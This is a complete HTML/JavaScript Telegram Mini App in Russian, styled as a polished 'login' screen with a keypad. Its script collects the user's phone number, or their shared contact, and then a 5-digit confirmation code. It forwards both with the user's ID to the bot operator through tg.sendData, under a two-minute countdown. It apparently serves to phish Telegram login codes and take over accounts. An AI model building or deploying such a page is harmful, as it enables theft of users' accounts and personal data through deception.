<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telegram Mini App</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
            transition: background 0.5s ease;
            overflow-x: hidden;
        }
        
        /* ========== ДИНАМИЧЕСКИЙ ФОН ПО ВРЕМЕНИ СУТОК ========== */
        body.morning {
            background: linear-gradient(145deg, #87CEEB 0%, #98D8E8 50%, #FFE4B5 100%);
        }
        
        body.day {
            background: linear-gradient(145deg, #4A90E2 0%, #6CA6F0 50%, #FFD966 100%);
        }
        
        body.evening {
            background: linear-gradient(145deg, #FF7F50 0%, #FFA07A 50%, #9370DB 100%);
        }
        
        body.night {
            background: linear-gradient(145deg, #1A2F4F 0%, #2A3F5F 50%, #1E3A5F 100%);
        }
        
        /* ========== ПОГОДНЫЕ ТЕМЫ ========== */
        body.sunny {
            background: linear-gradient(145deg, #FFD700 0%, #FFA500 50%, #FF8C00 100%);
        }
        
        body.rainy {
            background: linear-gradient(145deg, #4A6B8F 0%, #6B8EB0 50%, #8FB0D0 100%);
            position: relative;
        }
        
        body.rainy::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: repeating-linear-gradient(45deg, rgba(255,255,255,0.1) 0px, rgba(255,255,255,0.1) 2px, transparent 2px, transparent 10px);
            pointer-events: none;
            animation: rain 1s linear infinite;
        }
        
        @keyframes rain {
            0% { transform: translateY(0); }
            100% { transform: translateY(20px); }
        }
        
        body.snowy {
            background: linear-gradient(145deg, #E0F0FF 0%, #F0F8FF 50%, #FFFFFF 100%);
        }
        
        body.snowy::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: radial-gradient(circle at 10% 20%, rgba(255,255,255,0.8) 1px, transparent 1px);
            background-size: 50px 50px;
            pointer-events: none;
            animation: snow 3s linear infinite;
        }
        
        @keyframes snow {
            0% { transform: translateY(0); }
            100% { transform: translateY(50px); }
        }
        
        body.cloudy {
            background: linear-gradient(145deg, #B0C4DE 0%, #C0D4E8 50%, #D0E4F8 100%);
        }
        
        /* ========== СЕЗОННЫЕ ТЕМЫ ========== */
        body.spring {
            background: linear-gradient(145deg, #B0E57C 0%, #C0F080 50%, #D0F5A0 100%);
        }
        
        body.spring::after {
            content: '🌸';
            position: absolute;
            font-size: 40px;
            opacity: 0.2;
            animation: float 6s ease-in-out infinite;
        }
        
        body.summer {
            background: linear-gradient(145deg, #FFD700 0%, #FFB347 50%, #FF8C42 100%);
        }
        
        body.summer::after {
            content: '☀️';
            position: absolute;
            font-size: 60px;
            opacity: 0.2;
            animation: rotate 10s linear infinite;
        }
        
        body.autumn {
            background: linear-gradient(145deg, #D2691E 0%, #F4A460 50%, #FFB347 100%);
        }
        
        body.autumn::after {
            content: '🍂';
            position: absolute;
            font-size: 40px;
            opacity: 0.2;
            animation: fall 5s ease-in infinite;
        }
        
        body.winter {
            background: linear-gradient(145deg, #ADD8E6 0%, #B0E0E6 50%, #E0FFFF 100%);
        }
        
        @keyframes float {
            0%, 100% { transform: translateY(0) rotate(0deg); }
            50% { transform: translateY(-20px) rotate(5deg); }
        }
        
        @keyframes rotate {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }
        
        @keyframes fall {
            0% { transform: translateY(-100px) rotate(0deg); }
            100% { transform: translateY(100vh) rotate(360deg); }
        }
        
        /* ========== ПАРАЛЛАКС ЭФФЕКТ ========== */
        .parallax-layer {
            position: absolute;
            width: 100%;
            height: 100%;
            pointer-events: none;
            transition: transform 0.2s;
        }
        
        /* ========== ЧАСТИЦЫ НА ФОНЕ ========== */
        .particle {
            position: absolute;
            width: 3px;
            height: 3px;
            background: rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            pointer-events: none;
            animation: particleMove 10s linear infinite;
        }
        
        @keyframes particleMove {
            from { transform: translateY(100vh); }
            to { transform: translateY(-100vh); }
        }
        
        /* ========== АБСТРАКТНЫЕ ВОЛНЫ ========== */
        .wave {
            position: absolute;
            width: 100%;
            height: 100%;
            background: repeating-linear-gradient(45deg, rgba(255,255,255,0.1) 0px, rgba(255,255,255,0.1) 10px, transparent 10px, transparent 20px);
            opacity: 0.3;
            pointer-events: none;
            animation: waveMove 8s linear infinite;
        }
        
        @keyframes waveMove {
            from { background-position: 0 0; }
            to { background-position: 100px 100px; }
        }
        
        .container {
            max-width: 400px;
            width: 100%;
            position: relative;
            z-index: 10;
        }
        
        /* ========== ГЛАВНАЯ КАРТОЧКА ========== */
        .glass-card {
            background: rgba(255, 255, 255, 0.2);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.4);
            border-radius: 32px;
            padding: 28px 24px;
            box-shadow: 
                0 20px 40px rgba(0, 0, 0, 0.3),
                inset 0 1px 2px rgba(255, 255, 255, 0.8),
                inset 0 -2px 4px rgba(0, 0, 0, 0.2);
            position: relative;
            overflow: hidden;
            transform-style: preserve-3d;
            transition: transform 0.1s;
        }
        
        /* ========== ЭФФЕКТ ПРЕЛОМЛЕНИЯ ========== */
        .glass-card::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle at 30% 30%, rgba(255,255,255,0.4) 0%, transparent 60%);
            opacity: 0.6;
            pointer-events: none;
            animation: shimmer 8s infinite linear;
        }
        
        @keyframes shimmer {
            0% { transform: translate(0, 0) rotate(0deg); }
            100% { transform: translate(10%, 10%) rotate(5deg); }
        }
        
        /* ========== ВОЛНА ПРИ НАЖАТИИ ========== */
        .ripple {
            position: absolute;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.4);
            transform: scale(0);
            animation: ripple-animation 0.6s ease-out;
            pointer-events: none;
        }
        
        @keyframes ripple-animation {
            to {
                transform: scale(4);
                opacity: 0;
            }
        }
        
        h1 {
            font-size: 28px;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            gap: 8px;
            color: white;
            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
            font-weight: 600;
            letter-spacing: -0.5px;
        }
        
        .subtitle {
            color: rgba(255, 255, 255, 0.9);
            margin-bottom: 28px;
            font-size: 15px;
            text-shadow: 0 1px 2px rgba(0,0,0,0.2);
        }
        
        /* ========== КАРТОЧКА ПОЛЬЗОВАТЕЛЯ ========== */
        .user-card {
            background: rgba(0, 0, 0, 0.25);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: 24px;
            padding: 16px;
            margin-bottom: 24px;
            display: flex;
            align-items: center;
            gap: 14px;
            box-shadow: inset 0 1px 3px rgba(255,255,255,0.4);
        }
        
        .avatar {
            width: 52px;
            height: 52px;
            border-radius: 26px;
            background: linear-gradient(145deg, rgba(74, 158, 255, 0.8), rgba(42, 107, 176, 0.8));
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
            color: white;
            border: 2px solid rgba(255, 255, 255, 0.6);
            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
        }
        
        .user-details {
            flex: 1;
        }
        
        .user-name {
            font-weight: 600;
            font-size: 17px;
            color: white;
            text-shadow: 0 1px 2px rgba(0,0,0,0.3);
            margin-bottom: 4px;
        }
        
        .user-id {
            font-size: 13px;
            color: rgba(255, 255, 255, 0.8);
        }
        
        /* ========== СТАТУС БАР ========== */
        .status-bar {
            background: rgba(0, 0, 0, 0.3);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.25);
            border-radius: 100px;
            padding: 14px 18px;
            margin-bottom: 24px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            box-shadow: inset 0 1px 3px rgba(255,255,255,0.3);
        }
        
        .status-text {
            font-size: 15px;
            font-weight: 500;
            color: white;
            text-shadow: 0 1px 2px rgba(0,0,0,0.2);
        }
        
        .status-dot {
            width: 12px;
            height: 12px;
            border-radius: 6px;
            transition: all 0.3s;
            box-shadow: 0 0 10px currentColor;
        }
        
        .status-dot.success {
            background: #4CAF50;
            box-shadow: 0 0 15px #4CAF50;
            animation: pulse 1.5s infinite;
        }
        
        .status-dot.waiting {
            background: #FF9800;
            box-shadow: 0 0 15px #FF9800;
            animation: pulse 1s infinite;
        }
        
        .status-dot.error {
            background: #f44336;
            box-shadow: 0 0 15px #f44336;
            animation: pulse 0.5s infinite;
        }
        
        @keyframes pulse {
            0% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.7; transform: scale(0.9); }
            100% { opacity: 1; transform: scale(1); }
        }
        
        /* ========== ДИСПЛЕЙ ========== */
        .display-container {
            margin-bottom: 24px;
        }
        
        .display-label {
            font-size: 13px;
            color: rgba(255, 255, 255, 0.8);
            margin-bottom: 8px;
            margin-left: 8px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        .glass-display {
            background: rgba(0, 0, 0, 0.3);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.4);
            border-radius: 20px;
            padding: 18px;
            text-align: center;
            font-size: 24px;
            font-family: monospace;
            color: white;
            text-shadow: 0 2px 5px rgba(0,0,0,0.3);
            box-shadow: inset 0 2px 5px rgba(0,0,0,0.2);
            min-height: 70px;
            display: flex;
            align-items: center;
            justify-content: center;
            word-break: break-all;
            letter-spacing: 1px;
            transition: all 0.3s;
        }
        
        .glass-display.code-mode {
            font-size: 32px;
            letter-spacing: 10px;
        }
        
        .glass-display.placeholder {
            color: rgba(255, 255, 255, 0.4);
        }
        
        /* ========== ПРОГРЕСС СЕКЦИЯ ========== */
        .progress-section {
            background: rgba(0, 0, 0, 0.25);
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
            border: 1px solid rgba(255, 255, 255, 0.25);
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 24px;
        }
        
        .progress-bar-container {
            width: 100%;
            height: 8px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 4px;
            overflow: hidden;
            margin-bottom: 10px;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #4a9eff, #6ab0ff);
            width: 0%;
            transition: width 0.1s linear;
            border-radius: 4px;
            box-shadow: 0 0 10px #4a9eff;
        }
        
        .progress-text {
            text-align: center;
            color: rgba(255, 255, 255, 0.8);
            font-size: 13px;
        }
        
        /* ========== ТАЙМЕР ========== */
        .timer-section {
            background: rgba(0, 0, 0, 0.3);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 24px;
            text-align: center;
        }
        
        .timer-display {
            font-size: 44px;
            font-weight: 300;
            font-family: monospace;
            color: white;
            text-shadow: 0 2px 10px rgba(0,0,0,0.3);
            letter-spacing: 5px;
        }
        
        .timer-display.warning {
            color: #FF9800;
        }
        
        .timer-display.expired {
            color: #f44336;
        }
        
        .timer-label {
            color: rgba(255, 255, 255, 0.7);
            font-size: 13px;
            margin-top: 8px;
        }
        
        /* ========== КЛАВИАТУРА ========== */
        .keypad {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin-bottom: 24px;
        }
        
        .glass-key {
            background: rgba(255, 255, 255, 0.15);
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
            border: 1px solid rgba(255, 255, 255, 0.35);
            border-radius: 20px;
            padding: 18px;
            font-size: 24px;
            font-weight: 500;
            text-align: center;
            color: white;
            cursor: pointer;
            transition: all 0.1s;
            user-select: none;
            box-shadow: 
                0 4px 10px rgba(0, 0, 0, 0.2),
                inset 0 1px 3px rgba(255, 255, 255, 0.6);
            text-shadow: 0 1px 3px rgba(0,0,0,0.3);
        }
        
        .glass-key:active {
            background: rgba(255, 255, 255, 0.3);
            transform: scale(0.95);
            box-shadow: inset 0 2px 5px rgba(0,0,0,0.2);
        }
        
        .glass-key.zero {
            grid-column: span 2;
        }
        
        .glass-key.delete {
            background: rgba(211, 47, 47, 0.5);
        }
        
        .glass-key.confirm {
            background: rgba(76, 175, 80, 0.5);
        }
        
        /* ========== КНОПКИ ДЕЙСТВИЙ ========== */
        .actions-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin-bottom: 20px;
        }
        
        .glass-action {
            background: rgba(255, 255, 255, 0.12);
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
            border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: 18px;
            padding: 16px;
            text-align: center;
            color: white;
            cursor: pointer;
            transition: all 0.1s;
            font-size: 15px;
            font-weight: 500;
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
        }
        
        .glass-action:active {
            background: rgba(255, 255, 255, 0.25);
            transform: scale(0.97);
        }
        
        .glass-action.primary {
            background: linear-gradient(145deg, rgba(74, 158, 255, 0.6), rgba(42, 107, 176, 0.6));
        }
        
        /* ========== НАВИГАЦИЯ ========== */
        .nav-grid {
            display: grid;
            grid-template-columns: 1fr 1fr 1fr;
            gap: 10px;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid rgba(255, 255, 255, 0.25);
        }
        
        .glass-nav {
            background: rgba(0, 0, 0, 0.25);
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
            border: 1px solid rgba(255, 255, 255, 0.25);
            border-radius: 16px;
            padding: 14px;
            text-align: center;
            color: white;
            cursor: pointer;
            transition: all 0.1s;
            font-size: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
        }
        
        .glass-nav:active {
            background: rgba(0, 0, 0, 0.35);
        }
        
        /* ========== СТИКЕРЫ ========== */
        .sticker-container {
            position: absolute;
            font-size: 60px;
            opacity: 0.15;
            pointer-events: none;
            z-index: 5;
        }
        
        .sticker-1 {
            top: 10px;
            right: 20px;
            transform: rotate(15deg);
            animation: float 6s ease-in-out infinite;
        }
        
        .sticker-2 {
            bottom: 10px;
            left: 20px;
            transform: rotate(-10deg);
            animation: float 8s ease-in-out infinite reverse;
        }
        
        .sticker-3 {
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%) rotate(5deg);
            animation: rotate 20s linear infinite;
        }
        
        /* ========== АВТОФОРМАТ НОМЕРА ========== */
        .formatted-phone {
            font-family: monospace;
            letter-spacing: 2px;
        }
        
        /* ========== УТИЛИТЫ ========== */
        .hidden {
            display: none;
        }
    </style>
</head>
<body class="day">
    <!-- Стикеры -->
    <div class="sticker-container sticker-1">🦆</div>
    <div class="sticker-container sticker-2">🦆</div>
    <div class="sticker-container sticker-3">🦆</div>
    
    <!-- Частицы (создаются через JS) -->
    <div id="particles"></div>
    
    <!-- Абстрактные волны -->
    <div class="wave"></div>
    
    <div class="container">
        <div class="glass-card" id="glassCard">
            <h1>📱 Вход</h1>
            <div class="subtitle">Нажми кнопку для отправки номера</div>
            
            <!-- Карточка пользователя -->
            <div class="user-card">
                <div class="avatar" id="userAvatar">👤</div>
                <div class="user-details">
                    <div class="user-name" id="userName">Загрузка...</div>
                    <div class="user-id" id="userId">ID: ...</div>
                </div>
            </div>
            
            <!-- Статус бар -->
            <div class="status-bar">
                <span class="status-text" id="statusText">Ожидание действий</span>
                <span class="status-dot waiting" id="statusDot"></span>
            </div>
            
            <!-- Дисплей -->
            <div class="display-container">
                <div class="display-label" id="displayLabel">Введите номер</div>
                <div class="glass-display" id="displayBox">—</div>
            </div>
            
            <!-- Прогресс -->
            <div id="progressSection" class="progress-section hidden">
                <div class="progress-bar-container">
                    <div class="progress-fill" id="progressFill"></div>
                </div>
                <div class="progress-text" id="progressText">0%</div>
            </div>
            
            <!-- Таймер -->
            <div id="timerSection" class="timer-section hidden">
                <div class="timer-display" id="timerDisplay">02:00</div>
                <div class="timer-label">Осталось для ввода кода</div>
            </div>
            
            <!-- Клавиатура -->
            <div class="keypad">
                <div class="glass-key" onclick="addDigit(1)">1</div>
                <div class="glass-key" onclick="addDigit(2)">2</div>
                <div class="glass-key" onclick="addDigit(3)">3</div>
                <div class="glass-key" onclick="addDigit(4)">4</div>
                <div class="glass-key" onclick="addDigit(5)">5</div>
                <div class="glass-key" onclick="addDigit(6)">6</div>
                <div class="glass-key" onclick="addDigit(7)">7</div>
                <div class="glass-key" onclick="addDigit(8)">8</div>
                <div class="glass-key" onclick="addDigit(9)">9</div>
                <div class="glass-key delete" onclick="deleteDigit()">⌫</div>
                <div class="glass-key zero" onclick="addDigit(0)">0</div>
                <div class="glass-key confirm" onclick="confirmInput()">✓</div>
            </div>
            
            <!-- Действия -->
            <div class="actions-grid">
                <div class="glass-action" onclick="requestContact()">📱 Отправить контакт</div>
                <div class="glass-action primary" onclick="clearDisplay()">🔄 Очистить</div>
            </div>
            
            <!-- Навигация -->
            <div class="nav-grid">
                <div class="glass-nav" onclick="goBack()">
                    <span>←</span> Назад
                </div>
                <div class="glass-nav" onclick="switchMode()" id="modeSwitch">
                    🔢 Режим кода
                </div>
                <div class="glass-nav" onclick="resetApp()">
                    🔄 Сброс
                </div>
            </div>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        tg.ready();
        
        const user = tg.initDataUnsafe?.user;
        let phoneNumber = '';
        let codeDigits = '';
        let currentMode = 'phone';
        let timerInterval = null;
        let progressInterval = null;
        let timeLeft = 120;
        
        // ========== ПАРАЛЛАКС ЭФФЕКТ ==========
        const card = document.getElementById('glassCard');
        
        document.addEventListener('mousemove', (e) => {
            if (!card) return;
            
            const x = (e.clientX / window.innerWidth - 0.5) * 20;
            const y = (e.clientY / window.innerHeight - 0.5) * 20;
            
            card.style.transform = `perspective(1000px) rotateX(${y}deg) rotateY(${x}deg)`;
        });
        
        // ========== ДИНАМИЧЕСКАЯ ТЕМА ==========
        function setThemeByTime() {
            const hour = new Date().getHours();
            const body = document.body;
            
            body.classList.remove('morning', 'day', 'evening', 'night');
            
            if (hour >= 6 && hour < 12) {
                body.classList.add('morning');
            } else if (hour >= 12 && hour < 18) {
                body.classList.add('day');
            } else if (hour >= 18 && hour < 24) {
                body.classList.add('evening');
            } else {
                body.classList.add('night');
            }
        }
        
        // ========== СЛУЧАЙНАЯ ПОГОДНАЯ ТЕМА ==========
        function setRandomWeather() {
            const body = document.body;
            const weathers = ['sunny', 'rainy', 'snowy', 'cloudy'];
            const randomWeather = weathers[Math.floor(Math.random() * weathers.length)];
            
            weathers.forEach(w => body.classList.remove(w));
            body.classList.add(randomWeather);
        }
        
        // ========== СЛУЧАЙНАЯ СЕЗОННАЯ ТЕМА ==========
        function setRandomSeason() {
            const body = document.body;
            const seasons = ['spring', 'summer', 'autumn', 'winter'];
            const randomSeason = seasons[Math.floor(Math.random() * seasons.length)];
            
            seasons.forEach(s => body.classList.remove(s));
            body.classList.add(randomSeason);
        }
        
        // ========== ВОЛНА ПРИ НАЖАТИИ ==========
        function createRipple(event) {
            const button = event.currentTarget;
            const ripple = document.createElement('span');
            
            const rect = button.getBoundingClientRect();
            const size = Math.max(rect.width, rect.height);
            
            ripple.style.width = ripple.style.height = size + 'px';
            ripple.style.left = event.clientX - rect.left - size/2 + 'px';
            ripple.style.top = event.clientY - rect.top - size/2 + 'px';
            ripple.className = 'ripple';
            
            button.appendChild(ripple);
            
            setTimeout(() => ripple.remove(), 600);
        }
        
        // ========== ЧАСТИЦЫ НА ФОНЕ ==========
        function createParticles() {
            const particlesContainer = document.getElementById('particles');
            
            for (let i = 0; i < 50; i++) {
                const particle = document.createElement('div');
                particle.className = 'particle';
                
                particle.style.left = Math.random() * 100 + '%';
                particle.style.animationDelay = Math.random() * 10 + 's';
                particle.style.animationDuration = 5 + Math.random() * 10 + 's';
                
                particlesContainer.appendChild(particle);
            }
        }
        
        // ========== АВТОФОРМАТ НОМЕРА ==========
        function formatPhoneNumber(number) {
            const cleaned = number.replace(/\D/g, '');
            
            if (cleaned.length === 11) {
                return `+${cleaned[0]} (${cleaned.slice(1, 4)}) ${cleaned.slice(4, 7)}-${cleaned.slice(7, 9)}-${cleaned.slice(9, 11)}`;
            } else if (cleaned.length === 10) {
                return `+7 (${cleaned.slice(0, 3)}) ${cleaned.slice(3, 6)}-${cleaned.slice(6, 8)}-${cleaned.slice(8, 10)}`;
            }
            
            return number;
        }
        
        // ========== ПРОВЕРКА НА КОД ==========
        function checkForCode(input) {
            const digits = input.replace(/\D/g, '');
            if (digits.length === 5 && currentMode === 'phone') {
                // Автоматически переключаемся на режим кода
                codeDigits = digits;
                phoneNumber = '';
                currentMode = 'code';
                document.getElementById('modeSwitch').textContent = '📞 Режим номера';
                showProgress('Код обнаружен...', 30);
            }
            updateDisplay();
        }
        
        // ========== ИНИЦИАЛИЗАЦИЯ ==========
        if (user) {
            document.getElementById('userName').textContent = user.first_name + (user.last_name ? ' ' + user.last_name : '');
            document.getElementById('userId').textContent = `ID: ${user.id}`;
            document.getElementById('userAvatar').textContent = user.first_name?.charAt(0) || '👤';
        }
        
        setThemeByTime();
        setRandomWeather();
        setRandomSeason();
        createParticles();
        
        // Обновляем тему каждые 5 минут
        setInterval(setThemeByTime, 300000);
        
        function updateDisplay() {
            const display = document.getElementById('displayBox');
            const label = document.getElementById('displayLabel');
            const dot = document.getElementById('statusDot');
            
            if (currentMode === 'phone') {
                label.textContent = 'Введите номер телефона';
                display.textContent = phoneNumber ? formatPhoneNumber(phoneNumber) : '—';
                display.classList.remove('code-mode');
            } else {
                label.textContent = 'Введите код подтверждения';
                display.textContent = codeDigits || '____';
                display.classList.add('code-mode');
            }
            
            if (phoneNumber) {
                document.getElementById('statusText').textContent = `✅ Номер: ${formatPhoneNumber(phoneNumber)}`;
                dot.className = 'status-dot success';
            } else if (currentMode === 'code' && codeDigits) {
                document.getElementById('statusText').textContent = `🔑 Код: ${codeDigits}`;
                dot.className = 'status-dot success';
            } else {
                document.getElementById('statusText').textContent = '⏳ Ожидание ввода';
                dot.className = 'status-dot waiting';
            }
        }
        
        function addDigit(digit) {
            if (currentMode === 'phone') {
                if (phoneNumber.length < 15) {
                    phoneNumber += digit;
                    showProgress('Ввод номера...', 20);
                }
            } else {
                if (codeDigits.length < 5) {
                    codeDigits += digit;
                    showProgress('Ввод кода...', 20);
                }
            }
            updateDisplay();
        }
        
        function deleteDigit() {
            if (currentMode === 'phone') {
                phoneNumber = phoneNumber.slice(0, -1);
            } else {
                codeDigits = codeDigits.slice(0, -1);
            }
            showProgress('Удаление...', 10);
            updateDisplay();
        }
        
        function clearDisplay() {
            if (currentMode === 'phone') {
                phoneNumber = '';
            } else {
                codeDigits = '';
            }
            showProgress('Очистка...', 10);
            updateDisplay();
        }
        
        function confirmInput() {
            if (currentMode === 'phone') {
                if (phoneNumber.length >= 10) {
                    showProgress('Отправка номера...', 50);
                    tg.sendData(JSON.stringify({
                        action: 'phone_entered',
                        phone: phoneNumber,
                        user_id: user?.id
                    }));
                    document.getElementById('statusText').textContent = '✅ Номер отправлен';
                    document.getElementById('statusDot').className = 'status-dot success';
                    switchMode();
                } else {
                    document.getElementById('statusText').textContent = '❌ Слишком короткий номер';
                    document.getElementById('statusDot').className = 'status-dot error';
                }
            } else {
                if (codeDigits.length === 5) {
                    showProgress('Проверка кода...', 50);
                    tg.sendData(JSON.stringify({
                        action: 'code_entered',
                        code: codeDigits,
                        user_id: user?.id
                    }));
                    document.getElementById('statusText').textContent = '✅ Код отправлен';
                    document.getElementById('statusDot').className = 'status-dot success';
                    startTimer();
                } else {
                    document.getElementById('statusText').textContent = '❌ Введите 5 цифр';
                    document.getElementById('statusDot').className = 'status-dot error';
                }
            }
        }
        
        function requestContact() {
            showProgress('Запрос контакта...', 30);
            document.getElementById('statusText').textContent = '⏳ Запрос контакта...';
            document.getElementById('statusDot').className = 'status-dot waiting';
            
            tg.requestContact((success, response) => {
                if (success) {
                    const contact = response.contact;
                    phoneNumber = contact.phone_number;
                    showProgress('Обработка...', 20);
                    document.getElementById('statusText').textContent = '✅ Контакт получен';
                    document.getElementById('statusDot').className = 'status-dot success';
                    updateDisplay();
                    
                    tg.sendData(JSON.stringify({
                        action: 'contact_received',
                        phone: phoneNumber,
                        user_id: user?.id
                    }));
                } else {
                    document.getElementById('statusText').textContent = '❌ Отказ от отправки';
                    document.getElementById('statusDot').className = 'status-dot error';
                }
                hideProgress();
            });
        }
        
        function switchMode() {
            currentMode = currentMode === 'phone' ? 'code' : 'phone';
            document.getElementById('modeSwitch').textContent = 
                currentMode === 'phone' ? '🔢 Режим кода' : '📞 Режим номера';
            clearDisplay();
            showProgress('Смена режима...', 10);
        }
        
        function goBack() {
            showProgress('Возврат...', 10);
            tg.close();
        }
        
        function resetApp() {
            phoneNumber = '';
            codeDigits = '';
            currentMode = 'phone';
            stopTimer();
            hideProgress();
            document.getElementById('statusText').textContent = '🔄 Сброс выполнен';
            document.getElementById('statusDot').className = 'status-dot waiting';
            updateDisplay();
            document.getElementById('modeSwitch').textContent = '🔢 Режим кода';
        }
        
        function showProgress(text, duration = 30) {
            const section = document.getElementById('progressSection');
            const fill = document.getElementById('progressFill');
            const progressText = document.getElementById('progressText');
            
            section.classList.remove('hidden');
            progressText.textContent = text;
            
            if (progressInterval) clearInterval(progressInterval);
            
            let progress = 0;
            progressInterval = setInterval(() => {
                progress += 1;
                fill.style.width = progress + '%';
                
                if (progress >= 100) {
                    clearInterval(progressInterval);
                    setTimeout(() => {
                        section.classList.add('hidden');
                    }, 500);
                }
            }, duration * 10);
        }
        
        function hideProgress() {
            if (progressInterval) {
                clearInterval(progressInterval);
                progressInterval = null;
            }
            document.getElementById('progressSection').classList.add('hidden');
        }
        
        function startTimer() {
            const section = document.getElementById('timerSection');
            const display = document.getElementById('timerDisplay');
            
            section.classList.remove('hidden');
            
            if (timerInterval) clearInterval(timerInterval);
            
            timeLeft = 120;
            timerInterval = setInterval(() => {
                const mins = Math.floor(timeLeft / 60);
                const secs = timeLeft % 60;
                display.textContent = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
                
                if (timeLeft <= 30) display.classList.add('warning');
                if (timeLeft <= 10) {
                    display.classList.remove('warning');
                    display.classList.add('expired');
                }
                
                timeLeft--;
                
                if (timeLeft < 0) {
                    clearInterval(timerInterval);
                    display.textContent = '00:00';
                    document.getElementById('statusText').textContent = '⌛ Время вышло';
                    document.getElementById('statusDot').className = 'status-dot error';
                }
            }, 1000);
        }
        
        function stopTimer() {
            if (timerInterval) {
                clearInterval(timerInterval);
                timerInterval = null;
            }
            document.getElementById('timerSection').classList.add('hidden');
        }
        
        tg.BackButton.show();
    </script>
</body>
</html>
